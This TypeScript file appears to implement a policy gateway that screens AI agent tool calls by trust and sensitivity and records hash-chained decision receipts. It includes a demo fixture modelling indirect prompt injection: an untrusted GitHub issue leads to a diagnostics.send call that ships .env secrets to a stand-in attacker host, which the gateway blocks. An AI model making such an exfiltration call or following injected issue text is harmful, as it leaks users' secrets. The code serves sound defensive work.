import { createHash, randomUUID } from "node:crypto";
import { createServer } from "node:http";

type Trust = "trusted" | "external" | "untrusted";
type Sensitivity = "public" | "internal" | "confidential" | "secret";
type Decision = "allow" | "block" | "approval_required";
export type Action = { tool: string; destination?: string; writes?: boolean; context: { source: string; trust: Trust; sensitivity: Sensitivity; contentHash?: string }[] };
export type Receipt = { id: string; timestamp: string; decision: Decision; reason: string; policy: string; action: Action; previousHash: string | null; hash: string };

let previousHash: string | null = null;
const receipts: Receipt[] = [];
const approvedDestinations = new Set(["internal://diagnostics", "https://api.example.internal"]);

export function evaluate(action: Action): Receipt {
  const untrusted = action.context.some((item) => item.trust !== "trusted");
  const secret = action.context.some((item) => item.sensitivity === "secret");
  const external = Boolean(action.destination && !approvedDestinations.has(action.destination));
  let decision: Decision = "allow";
  let policy = "atreides/default-allow";
  let reason = "No protected capability crosses an untrusted boundary.";
  if (untrusted && action.tool === "filesystem.read_secret") {
    decision = "block"; policy = "atreides/no-untrusted-secret-read";
    reason = "Untrusted context cannot authorize a secret-read capability.";
  } else if (untrusted && secret && external) {
    decision = "block"; policy = "atreides/no-untrusted-secret-egress";
    reason = "Untrusted context cannot authorize transmission of secret-labelled data to an unapproved destination.";
  } else if (untrusted && (action.writes || external)) {
    decision = "approval_required"; policy = "atreides/untrusted-high-impact-action";
    reason = "Untrusted context reached a high-impact capability; explicit human approval is required.";
  }
  const base = { id: randomUUID(), timestamp: new Date().toISOString(), decision, reason, policy, action, previousHash };
  const hash = createHash("sha256").update(JSON.stringify(base)).digest("hex");
  const receipt = { ...base, hash };
  previousHash = hash; receipts.push(receipt); return receipt;
}

export const indirectInjectionFixture: Action = {
  tool: "diagnostics.send", destination: "https://attacker.invalid/collect",
  context: [
    { source: "github-issue#184", trust: "untrusted", sensitivity: "public", contentHash: "fixture:issue-184" },
    { source: ".env", trust: "trusted", sensitivity: "secret", contentHash: "fixture:fake-secret" }
  ]
};

function send(response: import("node:http").ServerResponse, status: number, payload: unknown) {
  response.writeHead(status, { "content-type": "application/json", "access-control-allow-origin": "*" });
  response.end(JSON.stringify(payload, null, 2));
}

export const server = createServer(async (request, response) => {
  if (request.method === "OPTIONS") return send(response, 204, {});
  if (request.url === "/health") return send(response, 200, { status: "ok", service: "atreides-gateway", receipts: receipts.length });
  if (request.method === "GET" && request.url === "/v1/receipts") return send(response, 200, { receipts });
  if (request.method === "POST" && request.url === "/v1/demo/indirect-prompt-injection") return send(response, 200, { receipt: evaluate(indirectInjectionFixture) });
  if (request.method === "POST" && request.url === "/v1/evaluate") {
    let body = ""; for await (const chunk of request) body += chunk;
    try { return send(response, 200, { receipt: evaluate(JSON.parse(body) as Action) }); }
    catch { return send(response, 400, { error: "Expected a valid action payload." }); }
  }
  return send(response, 404, { error: "Not found" });
});
